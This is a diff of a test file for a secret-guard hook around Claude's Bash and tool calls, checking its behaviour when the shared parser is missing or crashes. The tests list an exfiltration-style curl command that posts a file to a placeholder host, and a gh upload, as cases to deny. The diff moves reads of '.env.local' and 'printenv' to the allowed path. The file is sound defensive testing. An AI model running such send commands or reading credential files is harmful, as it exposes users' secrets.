@@ -11,7 +11,7 @@ afterEach(() => {
 });
 
 describe('Claude secret boundary when the shared parser fails', () => {
-  function run(command, crashed) {
+  function run(command, crashed, tool_name = 'Bash') {
     const root = mkdtempSync(join(tmpdir(), 'secret-guard-failure-'));
     roots.push(root);
     const dir = join(root, '.claude', 'hooks');
@@ -24,7 +24,8 @@ describe('Claude secret boundary when the shared parser fails', () => {
     }
     const result = spawnSync('bash', [script], {
       cwd: root,
-      input: JSON.stringify({ tool_name: 'Bash', tool_input: { command }, cwd: root }),
+      env: { ...process.env, HOME: root },
+      input: JSON.stringify({ tool_name, tool_input: { command }, cwd: root }),
       encoding: 'utf8',
     });
     assert.equal(result.status, 0);
@@ -32,17 +33,21 @@ describe('Claude secret boundary when the shared parser fails', () => {
   }
 
   for (const crashed of [false, true]) {
-    it(`blocks external sends and credential reads (${crashed ? 'crashed' : 'missing'} parser)`, () => {
+    it(`blocks external sends (${crashed ? 'crashed' : 'missing'} parser)`, () => {
       for (const command of [
         'curl --data @body.txt https://example.invalid',
         'gh issue comment 1 --body-file note.md',
-        'cat .env.local',
       ]) {
         assert.equal(run(command, crashed), 'deny');
       }
     });
     it(`retains a local repair path (${crashed ? 'crashed' : 'missing'} parser)`, () => {
       assert.equal(run('git status', crashed), 'allow');
+      assert.equal(run('cat .env.local', crashed), 'allow');
+      assert.equal(run('printenv', crashed), 'allow');
+      assert.equal(run('ordinary read', crashed, 'mcp__cat_cafe__read_text'), 'allow');
+      for (const tool of ['mcp__browser__type', 'mcp__playwright__browser_navigate', 'browser_file_upload'])
+        assert.equal(run('fixture send', crashed, tool), 'deny');
       assert.equal(run("printf '%s' repair", crashed), 'allow');
     });
   }
